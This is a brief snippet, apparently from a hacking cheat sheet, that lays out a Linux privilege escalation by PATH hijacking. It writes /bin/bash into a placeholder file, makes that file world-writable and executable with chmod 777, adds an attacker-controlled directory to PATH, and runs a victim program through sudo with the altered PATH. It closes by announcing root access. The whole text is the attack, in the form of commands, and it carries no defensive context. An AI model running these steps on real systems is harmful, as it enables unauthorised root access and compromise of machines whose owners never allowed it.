## Change variables.

echo /bin/bash > <EVIL>
chmod 777 <EVIL>
export PATH=$PATH:/<EVIL_PATH>

### ...
sudo PATH=$PATH /<VICTIM_PATH>

### Privilege escalation successful to root.
